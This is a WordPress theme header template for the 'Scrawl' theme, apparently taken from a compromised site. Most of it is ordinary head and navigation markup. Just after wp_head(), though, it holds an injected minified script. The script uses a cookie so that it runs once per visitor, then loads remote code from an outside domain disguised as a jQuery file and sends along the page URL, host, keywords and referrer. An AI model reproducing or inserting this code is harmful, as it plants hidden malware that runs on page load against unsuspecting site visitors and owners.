<?php
/**
 * The Header for our theme.
 *
 * Displays all of the <head> section and everything up till <div id="content">
 *
 * @package Scrawl
 */
?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?php wp_title( '|', true, 'right' ); ?></title>
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

<?php wp_head(); ?>

<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://www.dedalesdeana.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'G91825' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>

<body <?php body_class(); ?>>
<?php if ( is_active_sidebar( 'sidebar-1' ) || has_nav_menu( 'primary' ) || has_nav_menu ( 'social' ) ) : ?>
	<button class="menu-toggle x">
		<span class="lines"></span>
		<span class="screen-reader-text"><?php _e( 'Primary Menu', 'scrawl' ); ?></span>
	</button>
	<div class="slide-menu">
		<?php if ( function_exists( 'jetpack_the_site_logo' ) && has_site_logo() ) {
				jetpack_the_site_logo();
			} elseif ( '' !== get_theme_mod( 'scrawl_gravatar_email', '' ) ) {
				scrawl_get_gravatar();
			} 
		?>
		
		<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
		<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
		
		<?php if ( has_nav_menu ( 'social' ) ) : ?>
			<?php wp_nav_menu( array( 'theme_location' => 'social', 'depth' => 1, 'link_before' => '<span class="screen-reader-text">', 'link_after' => '</span>', 'container_class' => 'social-links', ) ); ?>
		<?php endif; ?>
		
		<?php if ( has_nav_menu( 'primary' ) ) : ?>
			<nav id="site-navigation" class="main-navigation" role="navigation">
				<?php wp_nav_menu( array( 'theme_location' => 'primary' ) ); ?>
			</nav><!-- #site-navigation -->
		<?php endif; ?>
		
		<?php if ( is_active_sidebar( 'sidebar-1' ) ) {
			get_sidebar();
		} ?>
	</div><!-- .slide-menu -->
<?php endif; ?>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php _e( 'Skip to content', 'scrawl' ); ?></a>

	<header id="masthead" class="site-header" role="banner">

		<div class="site-branding">
			<?php if ( function_exists( 'jetpack_the_site_logo' ) && has_site_logo() ) {
					jetpack_the_site_logo();
				} elseif ( '' !== get_theme_mod( 'scrawl_gravatar_email', '' ) ) {
					scrawl_get_gravatar();
				} 
			?>
			<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
		</div>

	</header><!-- #masthead -->

	<?php if ( get_header_image() ) : ?>
		<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home">
			<img class="custom-header" src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="">
		</a>
	<?php endif;  // End header image check. ?>

	<?php // Single post header images */

		  if ( is_single() && has_post_thumbnail() ) : ?>
		<div class="featured-header-image">
			<?php the_title( '<h1 class="entry-title"><a id="scroll-to-content" href="#post-' . get_the_ID() . '">', '</a></h1>' ); ?>
		</div>
	<?php endif; ?>

	<div id="content" class="site-content">

